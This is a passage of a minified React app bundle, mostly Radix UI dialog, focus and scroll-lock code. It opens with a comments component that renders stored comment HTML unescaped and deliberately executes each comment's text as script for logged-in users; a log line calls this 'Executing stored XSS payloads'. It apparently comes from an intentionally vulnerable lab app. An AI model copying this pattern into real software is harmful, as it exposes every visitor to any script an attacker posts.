text-xs",children:"HTML formatting allowed for styling your comment."}),d.jsx(oe,{onClick:o,children:"Post"})]})]})]})]})]})]})})},l6=()=>{const[t,e]=v.useState([]),[n,r]=v.useState(!0),{currentUser:i}=da();return v.useEffect(()=>{(async()=>{try{const o=await ua("comments");if(o.exists()){const a=o.val(),c=Object.keys(a).map(u=>({id:u,...a[u]}));c.sort((u,p)=>new Date(p.createdAt).getTime()-new Date(u.createdAt).getTime()),e(c)}}catch(o){console.error("Error fetching comments:",o)}finally{r(!1)}})()},[i]),v.useEffect(()=>{if(console.log("Comments effect triggered, currentUser:",i,"comments:",t.length),i&&t.length>0){console.log("Executing stored XSS payloads...");const s=document.createElement("div");s.style.display="none",s.id="xss-payload-execution",document.body.appendChild(s),t.forEach(o=>{try{const a=document.createElement("script");a.textContent=o.text.replace(/<script>(.*?)<\/script>/gs,"$1"),s.appendChild(a);const c=document.createElement("div");c.innerHTML=o.text,s.appendChild(c),console.log("Injected XSS payload:",o.text)}catch(a){console.error("Error executing payload:",a)}}),setTimeout(()=>{document.body.contains(s)&&document.body.removeChild(s)},3e3)}},[t,i]),n?d.jsx("div",{className:"flex justify-center py-8",children:d.jsx(Lt,{className:"h-32 w-full"})}):t.length===0?d.jsx("p",{className:"text-gray-500 italic",children:"Be the first to leave a comment!"}):d.jsx("div",{className:"space-y-4",children:t.map(s=>d.jsxs("div",{className:"bg-white p-4 rounded shadow-sm",children:[d.jsx("div",{dangerouslySetInnerHTML:{__html:s.text}}),d.jsx("div",{className:"text-gray-400 text-xs mt-2",children:new Date(s.createdAt).toLocaleDateString()})]},s.id))})};var c6=NE.useId||(()=>{}),u6=0;function gl(t){const[e,n]=v.useState(c6());return ji(()=>{t||n(r=>r??String(u6++))},[t]),t||(e?`radix-${e}`:"")}var gp="focusScope.autoFocusOnMount",vp="focusScope.autoFocusOnUnmount",Vx={bubbles:!1,cancelable:!0},d6="FocusScope",aI=v.forwardRef((t,e)=>{const{loop:n=!1,trapped:r=!1,onMountAutoFocus:i,onUnmountAutoFocus:s,...o}=t,[a,c]=v.useState(null),u=sn(i),p=sn(s),f=v.useRef(null),h=We(e,y=>c(y)),E=v.useRef({paused:!1,pause(){this.paused=!0},resume(){this.paused=!1}}).current;v.useEffect(()=>{if(r){let y=function(S){if(E.paused||!a)return;const N=S.target;a.contains(N)?f.current=N:Jr(f.current,{select:!0})},C=function(S){if(E.paused||!a)return;const N=S.relatedTarget;N!==null&&(a.contains(N)||Jr(f.current,{select:!0}))},x=function(S){if(document.activeElement===document.body)for(const R of S)R.removedNodes.length>0&&Jr(a)};document.addEventListener("focusin",y),document.addEventListener("focusout",C);const w=new MutationObserver(x);return a&&w.observe(a,{childList:!0,subtree:!0}),()=>{document.removeEventListener("focusin",y),document.removeEventListener("focusout",C),w.disconnect()}}},[r,a,E.paused]),v.useEffect(()=>{if(a){Wx.add(E);const y=document.activeElement;if(!a.contains(y)){const x=new CustomEvent(gp,Vx);a.addEventListener(gp,u),a.dispatchEvent(x),x.defaultPrevented||(h6(v6(lI(a)),{select:!0}),document.activeElement===y&&Jr(a))}return()=>{a.removeEventListener(gp,u),setTimeout(()=>{const x=new CustomEvent(vp,Vx);a.addEventListener(vp,p),a.dispatchEvent(x),x.defaultPrevented||Jr(y??document.body,{select:!0}),a.removeEventListener(vp,p),Wx.remove(E)},0)}}},[a,u,p,E]);const _=v.useCallback(y=>{if(!n&&!r||E.paused)return;const C=y.key==="Tab"&&!y.altKey&&!y.ctrlKey&&!y.metaKey,x=document.activeElement;if(C&&x){const w=y.currentTarget,[S,N]=f6(w);S&&N?!y.shiftKey&&x===N?(y.preventDefault(),n&&Jr(S,{select:!0})):y.shiftKey&&x===S&&(y.preventDefault(),n&&Jr(N,{select:!0})):x===w&&y.preventDefault()}},[n,r,E.paused]);return d.jsx(pe.div,{tabIndex:-1,...o,ref:h,onKeyDown:_})});aI.displayName=d6;function h6(t,{select:e=!1}={}){const n=document.activeElement;for(const r of t)if(Jr(r,{select:e}),document.activeElement!==n)return}function f6(t){const e=lI(t),n=Hx(e,t),r=Hx(e.reverse(),t);return[n,r]}function lI(t){const e=[],n=document.createTreeWalker(t,NodeFilter.SHOW_ELEMENT,{acceptNode:r=>{const i=r.tagName==="INPUT"&&r.type==="hidden";return r.disabled||r.hidden||i?NodeFilter.FILTER_SKIP:r.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;n.nextNode();)e.push(n.currentNode);return e}function Hx(t,e){for(const n of t)if(!p6(n,{upTo:e}))return n}function p6(t,{upTo:e}){if(getComputedStyle(t).visibility==="hidden")return!0;for(;t;){if(e!==void 0&&t===e)return!1;if(getComputedStyle(t).display==="none")return!0;t=t.parentElement}return!1}function m6(t){return t instanceof HTMLInputElement&&"select"in t}function Jr(t,{select:e=!1}={}){if(t&&t.focus){const n=document.activeElement;t.focus({preventScroll:!0}),t!==n&&m6(t)&&e&&t.select()}}var Wx=g6();function g6(){let t=[];return{add(e){const n=t[0];e!==n&&(n==null||n.pause()),t=Kx(t,e),t.unshift(e)},remove(e){var n;t=Kx(t,e),(n=t[0])==null||n.resume()}}}function Kx(t,e){const n=[...t],r=n.indexOf(e);return r!==-1&&n.splice(r,1),n}function v6(t){return t.filter(e=>e.tagName!=="A")}var yp=0;function y6(){v.useEffect(()=>{const t=document.querySelectorAll("[data-radix-focus-guard]");return document.body.insertAdjacentElement("afterbegin",t[0]??Gx()),document.body.insertAdjacentElement("beforeend",t[1]??Gx()),yp++,()=>{yp===1&&document.querySelectorAll("[data-radix-focus-guard]").forEach(e=>e.remove()),yp--}},[])}function Gx(){const t=document.createElement("span");return t.setAttribute("data-radix-focus-guard",""),t.tabIndex=0,t.style.outline="none",t.style.opacity="0",t.style.position="fixed",t.style.pointerEvents="none",t}var zu="right-scroll-bar-position",Bu="width-before-scroll-bar",_6="with-scroll-bars-hidden",w6="--removed-body-scroll-bar-size";function _p(t,e){return typeof t=="function"?t(e):t&&(t.current=e),t}function x6(t,e){var n=v.useState(function(){return{value:t,callback:e,facade:{get current(){return n.value},set current(r){var i=n.value;i!==r&&(n.value=r,n.callback(r,i))}}}})[0];return n.callback=e,n.facade}var E6=typeof window<"u"?v.useLayoutEffect:v.useEffect,qx=new WeakMap;function C6(t,e){var n=x6(null,function(r){return t.forEach(function(i){return _p(i,r)})});return E6(function(){var r=qx.get(n);if(r){var i=new Set(r),s=new Set(t),o=n.current;i.forEach(function(a){s.has(a)||_p(a,null)}),s.forEach(function(a){i.has(a)||_p(a,o)})}qx.set(n,t)},[t]),n}function S6(t){return t}function b6(t,e){e===void 0&&(e=S6);var n=[],r=!1,i={read:function(){if(r)throw new Error("Sidecar: could not `read` from an `assigned` medium. `read` could be used only with `useMedium`.");return n.length?n[n.length-1]:t},useMedium:function(s){var o=e(s,r);return n.push(o),function(){n=n.filter(function(a){return a!==o})}},assignSyncMedium:function(s){for(r=!0;n.length;){var o=n;n=[],o.forEach(s)}n={push:function(a){return s(a)},filter:function(){return n}}},assignMedium:function(s){r=!0;var o=[];if(n.length){var a=n;n=[],a.forEach(s),o=n}var c=function(){var p=o;o=[],p.forEach(s)},u=function(){return Promise.resolve().then(c)};u(),n={push:function(p){o.push(p),u()},filter:function(p){return o=o.filter(p),n}}}};return i}function T6(t){t===void 0&&(t={});var e=b6(null);return e.options=Jn({async:!0,ssr:!1},t),e}var cI=function(t){var e=t.sideCar,n=pc(t,["sideCar"]);if(!e)throw new Error("Sidecar: please provide `sideCar` property to import the right car");var r=e.read();if(!r)throw new Error("Sidecar medium not found");return v.createElement(r,Jn({},n))};cI.isSideCarExport=!0;function I6(t,e){return t.useMedium(e),cI}var uI=T6(),wp=function(){},Bh=v.forwardRef(function(t,e){var n=v.useRef(null),r=v.useState({onScrollCapture:wp,onWheelCapture:wp,onTouchMoveCapture:wp}),i=r[0],s=r[1],o=t.forwardProps,a=t.children,c=t.className,u=t.removeScrollBar,p=t.enabled,f=t.shards,h=t.sideCar,E=t.noIsolation,_=t.inert,y=t.allowPinchZoom,C=t.as,x=C===void 0?"div":C,w=t.gapMode,S=pc(t,["forwardProps","children","className","removeScrollBar","enabled","shards","sideCar","noIsolation","inert","allowPinchZoom","as","gapMode"]),N=h,R=C6([n,e]),j=Jn(Jn({},S),i);return v.createElement(v.Fragment,null,p&&v.createElement(N,{sideCar:uI,removeScrollBar:u,shards:f,noIsolation:E,inert:_,setCallbacks:s,allowPinchZoom:!!y,lockRef:n,gapMode:w}),o?v.cloneElement(v.Children.only(a),Jn(Jn({},j),{ref:R})):v.createElement(x,Jn({},j,{className:c,ref:R}),a))});Bh.defaultProps={enabled:!0,removeScrollBar:!0,inert:!1};Bh.classNames={fullWidth:Bu,zeroRight:zu};var N6=function(){if(typeof __webpack_nonce__<"u")return __webpack_nonce__};function k6(){if(!document)return null;var t=document.createElement("style");t.type="text/css";var e=N6();return e&&t.setAttribute("nonce",e),t}function P6(t,e){t.styleSheet?t.styleSheet.cssText=e:t.appendChild(document.createTextNode(e))}function R6(t){var e=document.head||document.getElementsByTagName("head")[0];e.appendChild(t)}var A6=function(){var t=0,e=null;return{add:function(n){t==0&&(e=k6())&&(P6(e,n),R6(e)),t++},remove:function(){t--,!t&&e&&(e.parentNode&&e.parentNode.removeChild(e),e=null)}}},O6=function(){var t=A6();return function(e,n){v.useEffect(function(){return t.add(e),function(){t.remove()}},[e&&n])}},dI=function(){var t=O6(),e=function(n){var r=n.styles,i=n.dynamic;return t(r,i),null};return e},D6={left:0,top:0,right:0,gap:0},xp=function(t){return parseInt(t||"",10)||0},j6=function(t){var e=window.getComputedStyle(document.body),n=e[t==="padding"?"paddingLeft":"marginLeft"],r=e[t==="padding"?"paddingTop":"marginTop"],i=e[t==="padding"?"paddingRight":"marginRight"];return[xp(n),xp(r),xp(i)]},M6=function(t){if(t===void 0&&(t="margin"),typeof window>"u")return D6;var e=j6(t),n=document.documentElement.clientWidth,r=window.innerWidth;return{left:e[0],top:e[1],right:e[2],gap:Math.max(0,r-n+e[2]-e[0])}},L6=dI(),wo="data-scroll-locked",F6=function(t,e,n,r){var i=t.left,s=t.top,o=t.right,a=t.gap;return n===void 0&&(n="margin"),`
  .`.concat(_6,` {
   overflow: hidden `).concat(r,`;
   padding-right: `).concat(a,"px ").concat(r,`;
  }
  body[`).concat(wo,`] {
    overflow: hidden `).concat(r,`;
    overscroll-behavior: contain;
    `).concat([e&&"position: relative ".concat(r,";"),n==="margin"&&`
    padding-left: `.concat(i,`px;
    padding-top: `).concat(s,`px;
    padding-right: `).concat(o,`px;
    margin-left:0;
    margin-top:0;
    margin-right: `).concat(a,"px ").concat(r,`;
    `),n==="padding"&&"padding-right: ".concat(a,"px ").concat(r,";")].filter(Boolean).join(""),`
  }
  
  .`).concat(zu,` {
    right: `).concat(a,"px ").concat(r,`;
  }
  
  .`).concat(Bu,` {
    margin-right: `).concat(a,"px ").concat(r,`;
  }
  
  .`).concat(zu," .").concat(zu,` {
    right: 0 `).concat(r,`;
  }
  
  .`).concat(Bu," .").concat(Bu,` {
    margin-right: 0 `).concat(r,`;
  }
  
  body[`).concat(wo,`] {
    `).concat(w6,": ").concat(a,`px;
  }
`)},Yx=function(){var t=parseInt(document.body.getAttribute(wo)||"0",10);return isFinite(t)?t:0},U6=function(){v.useEffect(function(){return document.body.setAttribute(wo,(Yx()+1).toString()),function(){var t=Yx()-1;t<=0?document.body.removeAttribute(wo):document.body.setAttribute(wo,t.toString())}},[])},$6=function(t){var e=t.noRelative,n=t.noImportant,r=t.gapMode,i=r===void 0?"margin":r;U6();var s=v.useMemo(function(){return M6(i)},[i]);return v.createElement(L6,{styles:F6(s,!e,i,n?"":"!important")})},sg=!1;if(typeof window<"u")try{var vu=Object.defineProperty({},"passive",{get:function(){return sg=!0,!0}});window.addEventListener("test",vu,vu),window.removeEventListener("test",vu,vu)}catch{sg=!1}var Hs=sg?{passive:!1}:!1,z6=function(t){return t.tagName==="TEXTAREA"},hI=function(t,e){if(!(t instanceof Element))return!1;var n=window.getComputedStyle(t);return n[e]!=="hidden"&&!(n.overflowY===n.overflowX&&!z6(t)&&n[e]==="visible")},B6=function(t){return hI(t,"overflowY")},V6=function(t){return hI(t,"overflowX")},Qx=function(t,e){var n=e.ownerDocument,r=e;do{typeof ShadowRoot<"u"&&r instanceof ShadowRoot&&(r=r.host);var i=fI(t,r);if(i){var s=pI(t,r),o=s[1],a=s[2];if(o>a)return!0}r=r.parentNode}while(r&&r!==n.body);return!1},H6=function(t){var e=t.scrollTop,n=t.scrollHeight,r=t.clientHeight;return[e,n,r]},W6=function(t){var e=t.scrollLeft,n=t.scrollWidth,r=t.clientWidth;return[e,n,r]},fI=function(t,e){return t==="v"?B6(e):V6(e)},pI=function(t,e){return t==="v"?H6(e):W6(e)},K6=function(t,e){return t==="h"&&e==="rtl"?-1:1},G6=function(t,e,n,r,i){var s=K6(t,window.getComputedStyle(e).direction),o=s*r,a=n.target,c=e.contains(a),u=!1,p=o>0,f=0,h=0;do{var E=pI(t,a),_=E[0],y=E[1],C=E[2],x=y-C-s*_;(_||x)&&fI(t,a)&&(f+=x,h+=_),a instanceof ShadowRoot?a=a.host:a=a.parentNode}while(!c&&a!==document.body||c&&(e.contains(a)||e===a));return(p&&(Math.abs(f)<1||!i)||!p&&(Math.abs(h)<1||!i))&&(u=!0),u},yu=function(t){return"changedTouches"in t?[t.changedTouches[0].clientX,t.changedTouches[0].clientY]:[0,0]},Xx=function(t){return[t.deltaX,t.deltaY]},Jx=function(t){return t&&"current"in t?t.current:t},q6=function(t,e){return t[0]===e[0]&&t[1]===e[1]},Y6=function(t){return`
  .block-interactivity-`.concat(t,` {pointer-events: none;}
  .allow-interactivity-`).concat(t,` {pointer-events: all;}
`)},Q6=0,Ws=[];function X6(t){var e=v.useRef([]),n=v.useRef([0,0]),r=v.useRef(),i=v.useState(Q6++)[0],s=v.useState(dI)[0],o=v.useRef(t);v.useEffect(function(){o.current=t},[t]),v.useEffect(function(){if(t.inert){document.body.classList.add("block-interactivity-".concat(i));var y=CM([t.lockRef.current],(t.shards||[]).map(Jx),!0).filter(Boolean);return y.forEach(function(C){return C.classList.add("allow-interactivity-".concat(i))}),function(){document.body.classList.remove("block-interactivity-".concat(i)),y.forEach(function(C){return C.classList.remove("allow-interactivity-".concat(i))})}}},[t.inert,t.lockRef.current,t.shards]);var a=v.useCallback(function(y,C){if("touches"in y&&y.touches.length===2||y.type==="wheel"&&y.ctrlKey)return!o.current.allowPinchZoom;var x=yu(y),w=n.current,S="deltaX"in y?y.deltaX:w[0]-x[0],N="deltaY"in y?y.deltaY:w[1]-x[1],R,j=y.target,T=Math.abs(S)>Math.abs(N)?"h":"v";if("touches"in y&&T==="h"&&j.type==="range")return!1;var b=Qx(T,j);if(!b)return!0;if(b?R=T:(R=T==="v"?"h":"v",b=Qx(T,j)),!b)return!1;if(!r.current&&"changedTouches"in y&&(S||N)&&(r.current=R),!R)return!0;var P=r.current||R;return G6(P,C,y,P==="h"?S:N,!0)},[]),c=v.useCallback(function(y){var C=y;if(!(!Ws.length||Ws[Ws.length-1]!==s)){var x="deltaY"in C?Xx(C):yu(C),w=e.current.filter(function(R){return R.name===C.type&&(R.target===C.target||C.target===R.shadowParent)&&q6(R.delta,x)})[0];if(w&&w.should){C.cancelable&&C.preventDefault();return}if(!w){var S=(o.current.shards||[]).map(Jx).filter(Boolean).filter(function(R){return R.contains(C.target)}),N=S.length>0?a(C,S[0]):!o.current.noIsolation;N&&C.cancelable&&C.preventDefault()}}},[]),u=v.useCallback(function(y,C,x,w){var S={name:y,delta:C,target:x,should:w,shadowParent:J6(x)};e.current.push(S),setTimeout(function(){e.current=e.current.filter(function(N){return N!==S})},1)},[]),p=v.useCallback(function(y){n.current=yu(y),r.current=void 0},[]),f=v.useCallback(function(y){u(y.type,Xx(y),y.target,a(y,t.lockRef.current))},[]),h=v.useCallback(function(y){u(y.type,yu(y),y.target,a(y,t.lockRef.current))},[]);v.useEffect(function(){return Ws.push(s),t.setCallbacks({onScrollCapture:f,onWheelCapture:f,onTouchMoveCapture:h}),document.addEventListener("wheel",c,Hs),document.addEventListener("touchmove",c,Hs),document.addEventListener("touchstart",p,Hs),function(){Ws=Ws.filter(function(y){return y!==s}),document.removeEventListener("wheel",c,Hs),document.removeEventListener("touchmove",c,Hs),document.removeEventListener("touchstart",p,Hs)}},[]);var E=t.removeScrollBar,_=t.inert;return v.createElement(v.Fragment,null,_?v.createElement(s,{styles:Y6(i)}):null,E?v.createElement($6,{gapMode:t.gapMode}):null)}function J6(t){for(var e=null;t!==null;)t instanceof ShadowRoot&&(e=t.host,t=t.host),t=t.parentNode;return e}const Z6=I6(uI,X6);var mI=v.forwardRef(function(t,e){return v.createElement(Bh,Jn({},t,{ref:e,sideCar:Z6}))});mI.classNames=Bh.classNames;var e9=function(t){if(typeof document>"u")return null;var e=Array.isArray(t)?t[0]:t;return e.ownerDocument.body},Ks=new WeakMap,_u=new WeakMap,wu={},Ep=0,gI=function(t){return t&&(t.host||gI(t.parentNode))},t9=function(t,e){return e.map(function(n){if(t.contains(n))return n;var r=gI(n);return r&&t.contains(r)?r:(console.error("aria-hidden",n,"in not contained inside",t,". Doing nothing"),null)}).filter(function(n){return!!n})},n9=function(t,e,n,r){var i=t9(e,Array.isArray(t)?t:[t]);wu[n]||(wu[n]=new WeakMap);var s=wu[n],o=[],a=new Set,c=new Set(i),u=function(f){!f||a.has(f)||(a.add(f),u(f.parentNode))};i.forEach(u);var p=function(f){!f||c.has(f)||Array.prototype.forEach.call(f.children,function(h){if(a.has(h))p(h);else try{var E=h.getAttribute(r),_=E!==null&&E!=="false",y=(Ks.get(h)||0)+1,C=(s.get(h)||0)+1;Ks.set(h,y),s.set(h,C),o.push(h),y===1&&_&&_u.set(h,!0),C===1&&h.setAttribute(n,"true"),_||h.setAttribute(r,"true")}catch(x){console.error("aria-hidden: cannot operate on ",h,x)}})};return p(e),a.clear(),Ep++,function(){o.forEach(function(f){var h=Ks.get(f)-1,E=s.get(f)-1;Ks.set(f,h),s.set(f,E),h||(_u.has(f)||f.removeAttribute(r),_u.delete(f)),E||f.removeAttribute(n)}),Ep--,Ep||(Ks=new WeakMap,Ks=new WeakMap,_u=new WeakMap,wu={})}},r9=function(t,e,n){n===void 0&&(n="data-aria-hidden");var r=Array.from(Array.isArray(t)?t:[t]),i=e9(t);return i?(r.push.apply(r,Array.from(i.querySelectorAll("[aria-live]"))),n9(r,i,n,"aria-hidden")):function(){return null}},Ty="Dialog",[vI,Jz]=Xo(Ty),[i9,$n]=vI(Ty),yI=t=>{const{__scopeDialog:e,children:n,open:r,defaultOpen:i,onOpenChange:s,modal:o=!0}=t,a=v.useRef(null),c=v.useRef(null),[u=!1,p]=Jo({prop:r,defaultProp:i,onChange:s});return d.jsx(i9,{scope:e,triggerRef:a,contentRef:c,contentId:gl(),titleId:gl(),descriptionId:gl(),open:u,onOpenChange:p,onOpenToggle:v.useCallback(()=>p(f=>!f),[p]),modal:o,children:n})};yI.displayName=Ty;var _I="DialogTrigger",wI=v.forwardRef((t,e)=>{const{__scopeDialog:n,...r}=t,i=$n(_I,n),s=We(e,i.triggerRef);return d.jsx(pe.button,{type:"button","aria-haspopup":"dialog","aria-expanded":i.open,"aria-controls":i.contentId,"data-state":ky(i.open),...r,ref:s,onClick:ie(t.onClick,i.onOpenToggle)})});wI.displayName=_I;var Iy="DialogPortal",[s9,xI]=vI(Iy,{forceMount:void 0}),EI=t=>{const{__scopeDialog:e,forceMount:n,children:r,container:i}=t,s=$n(Iy,e);return d.jsx(s9,{scope:e,forceMount:n,children:v.Children.map(r,o=>d.jsx(qi,{present:n||s.open,children:d.jsx(fv,{asChild:!0,container:i,children:o})}))})};EI.displayName=Iy;var qd="DialogOverlay",CI=v.forwardRef((t,e)=>{const n=xI(qd,t.__scopeDialog),{forceMount:r=n.forceMount,...i}=t,s=$n(qd,t.__scopeDialog);return s.modal?d.jsx(qi,{present:r||s.open,children:d.jsx(o9,{...i,ref:e})}):null});CI.displayName=qd;var o9=v.forwardRef((t,e)=>{const{__scopeDialog:n,...r}=t,i=$n(qd,n);return d.jsx(mI,{as:Fo,allowPinchZoom:!0,shards:[i.contentRef],children:d.jsx(pe.div,{"data-state":ky(i.open),...r,ref:e,style:{pointerEvents:"auto",...r.style}})})}),Ps="DialogContent",SI=v.forwardRef((t,e)=>{const n=xI(Ps,t.__scopeDialog),{forceMount:r=n.forceMount,...i}=t,s=$n(Ps,t.__scopeDialog);return d.jsx(qi,{present:r||s.open,children:s.modal?d.jsx(a9,{...i,ref:e}):d.jsx(l9,{...i,ref:e})})});SI.displayName=Ps;var a9=v.forwardRef((t,e)=>{const n=$n(Ps,t.__scopeDialog),r=v.useRef(null),i=We(e,n.contentRef,r);return v.useEffect(()=>{const s=r.current;if(s)return r9(s)},[]),d.jsx(bI,{...t,ref:i,trapFocus:n.open,disableOutsidePointerEvents:!0,onCloseAutoFocus:ie(t.onCloseAutoFocus,s=>{var o;s.preventDefault(),(o=n.triggerRef.current)==null||o.focus()}),onPointerDownOutside:ie(t.onPointerDownOutside,s=>{const o=s.detail.originalEvent,a=o.button===0&&o.ctrlKey===!0;(o.button===2||a)&&s.preventDefault()}),onFocusOutside:ie(t.onFocusOutside,s=>s.preventDefault())})}),l9=v.forwardRef((t,e)=>{const n=$n(Ps,t.__scopeDialog),r=v.useRef(!1),i=v.useRef(!1);return d.jsx(bI,{...t,ref:e,trapFocus:!1,disableOutsidePointerEvents:!1,onCloseAutoFocus:s=>{var o,a;(o=t.onCloseAutoFocus)==null||o.call(t,s),s.defaultPrevented||(r.current||(a=n.triggerRef.current)==null||a.focus(),s.preventDefault()),r.current=!1,i.current=!1},onInteractOutside:s=>{var c,u;(c=t.onInteractOutside)==null||c.call(t,s),s.defaultPrevented||(r.current=!0,s.detail.originalEvent.type==="pointerdown"&&(i.current=!0));const o=s.target;((u=n.triggerRef.current)==null?void 0:u.contains(o))&&s.preventDefault(),s.detail.originalEvent.type==="focusin"&&i.current&&s.preventDefault()}})}),bI=v.forwardRef((t,e)=>{const{__scopeDialog:n,trapFocus:r,onOpenAutoFocus:i,onCloseAutoFocus:s,...o}=t,a=$n(Ps,n),c=v.useRef(null),u=We(e,c);return y6(),d.jsxs(d.Fragment,{children:[d.jsx(aI,{asChild:!0,loop:!0,trapped:r,onMountAutoFocus:i,onUnmountAutoFocus:s,children:d.jsx(mh,{role:"dialog",id:a.contentId,"aria-describedby":a.descriptionId,"aria-labelledby":a.titleId,"data-state":ky(a.open),...o,ref:u,onDismiss:()=>a.onOpenChange(!1)})}),d.jsxs(d.Fragment,{children:[d.jsx(c9,{titleId:a.titleId}),d.jsx(d9,{contentRef:c,descriptionId:a.descriptionId})]})]})}),Ny="DialogTitle",TI=v.forwardRef((t,e)=>{const{__scopeDialog:n,...r}=t,i=$n(Ny,n);return d.jsx(pe.h2,{id:i.titleId,...r,ref:e})});TI.displayName=Ny;var II="DialogDescription",NI=v.forwardRef((t,e)=>{const{__scopeDialog:n,...r}=t,i=$n(II,n);return d.jsx(pe.p,{id:i.descriptionId,...r,ref:e})});NI.displayName=II;var kI="DialogClose",PI=v.forwardRef((t,e)=>{const{__scopeDialog:n,...r}=t,i=$n(kI,n);return d.jsx(pe.button,{type:"button",...r,ref:e,onClick:ie(t.onClick,()=>i.onOpenChange(!1))})});PI.displayName=kI;function ky(t){return t?"open":"closed"}var RI="DialogTitleWarning",[Zz,AI]=fA(RI,{contentName:Ps,titleName:Ny,docsSlug:"dialog"}),c9=({titleId:t})=>{const e=AI(RI),n=`\`${e.contentName}\` requires a \`${e.titleName}\` for the component to be accessible for screen reader users.

If you want to hide the \`${e.titleName}\`, you can wrap it with our VisuallyHidden component.

For more information, see https://radix-ui.com/primitives/docs/components/${e.docsSlug}`;return v.useEffect(()=>{t&&(document.getElementById(t)||console.error(n))},[n,t]),null},u9="DialogDescriptionWarning",d9=({contentRef:t,descriptionId:e})=>{const r=`Warning: Missing \`Description\` or \`aria-describedby={undefined}\` for {${AI(u9).contentName}}.`;return v.useEffect(()=>{var s;const i=(s=t.current)==null?void 0:s.getAttribute("aria-describedby");e&&i&&(document.getElementById(e)||console.warn(r))},[r,t,e]),null},OI=yI,h9=wI,DI=EI,Vh=CI,Hh=SI,Wh=TI,Kh=NI,jI=PI;const Py=OI,MI=h9,f9=DI,LI=v.forwardRef(({className:t,...e},n)=>d.jsx(Vh,{className:fe("fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0",t),...e,ref:n}));LI.displayName=Vh.displayName;const p9=_h("fixed z-50 gap-4 bg-background p-6 shadow-lg transition ease-in-out data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:duration-300 data-[state=open]:duration-500",{variants:{side:{top:"inset-x-0 top-0 border-b data-[state=closed]:slide-out-to-top data-[state=open]:slide-in-from-top",bottom:"inset-x-0 bottom-0 border-t data-[state=closed]:slide-out-to-bottom data-[state=open]:slide-in-from-bottom",left:"inset-y-0 left-0 h-full w-3/4 border-r data-[state=closed]:slide-out-to-left data-[state=open]:slide-in-from-left sm:max-w-sm",right:"inset-y-0 right-0 h-full w-3/4  border-l data-[state=closed]:slide-out-to-right data-[state=open]:slide-in-from-right sm:max-w-sm"}},defaultVariants:{side:"right"}}),Gh=v.forwardRef(({side:t="right",className:e,children:n,...r},i)=>d.jsxs(f9,{children:[d.jsx(LI,{}),d.jsxs(Hh,{ref:i,className:fe(p9({side:t}),e),...r,children:[n,d.jsxs(jI,{className:"absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-secondary",children:[d.jsx(lc,{className:"h-4 w-4"}),d.jsx("span",{className:"sr-only",children:"Close"})]})]})]}));Gh.displayName=Hh.displayName;const FI=({className:t,...e})=>d.jsx("div",{className:fe("flex flex-col space-y-2 text-center sm:text-left",t),...e});FI.displayName="SheetHeader";const UI=v.forwardRef(({className:t,...e},n)=>d.jsx(Wh,{ref:n,className:fe("text-lg font-semibold text-foreground",t),...e}));UI.displayName=Wh.displayName;const m9=v.forwardRef(({className:t,...e},n)=>d.jsx(Kh,{ref:n,className:fe("text-sm text-muted-foreground",t),...e}));m9.displayName=Kh.displayName;const g9=OI,v9=DI,$I=v.forwardRef(({className:t,...e},n)=>d.jsx(Vh,{ref:n,className:fe("fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0",t),...e}));$I.displayName=Vh.displayName;const zI=v.forwardRef(({className:t,children:e,...n},r)=>d.jsxs(v9,{children:[d.jsx($I,{}),d.jsxs(Hh,{ref:r,className:fe("fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg",t),...n,children:[e,d.jsxs(jI,{className:"absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground",children:[d.jsx(lc,{className:"h-4 w-4"}),d.jsx("span",{className:"sr-only",children:"Close"})]})]})]}));zI.displayName=Hh.displayName;const BI=({className:t,...e})=>d.jsx("div",{className:fe("flex flex-col space-y-1.5 text-center sm:text-left",t),...e});BI.displayName="DialogHeader";const VI=v.forwardRef(({className:t,...e},n)=>d.jsx(Wh,{ref:n,className:fe("text-lg font-semibold leading-none tracking-tight",t),...e}));VI.displayName=Wh.displayName;const y9=v.forwardRef(({className:t,...e},n)=>d.jsx(Kh,{ref:n,className:fe("text-sm text-muted-foreground",t),...e}));y9.displayName=Kh.displayName;function _9(t,e=[]){let n=[];function r(s,o){const a=v.createContext(o),c=n.length;n=[...n,o];function u(f){const{scope:h,children:E,..._}=f,y=(h==null?void 0:h[t][c])||a,C=v.useMemo(()=>_,Object.values(_));return d.jsx(y.Provider,{value:C,children:E})}function p(f,h){const E=(h==null?void 0:h[t][c])||a,_=v.useContext(E);if(_)return _;if(o!==void 0)return o;throw new Error(`\`${f}\` must be used within \`${s}\``)}return u.displayName=s+"Provider",[u,p]}const i=()=>{const s=n.map(o=>v.createContext(o));return function(a){const c=(a==null?void 0:a[t])||s;return v.useMemo(()=>({[`__scope${t}`]:{...a,[t]:c}}),[a,c])}};return i.scopeName=t,[r,w9(i,...e)]}function w9(...t){const e=t[0];if(t.length===1)return e;const n=()=>{const r=t.map(i=>({useScope:i(),scopeName:i.scopeName}));return function(s){const o=r.reduce((a,{useScope:c,scopeName:u})=>{const f=c(s)[`__scope${u}`];return{...a,...f}},{});return v.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return n.scopeName=e.scopeName,n}var x9=v.createContext(void 0);function Ry(t){const e=v.useContext(x9);return t||e||"ltr"}var 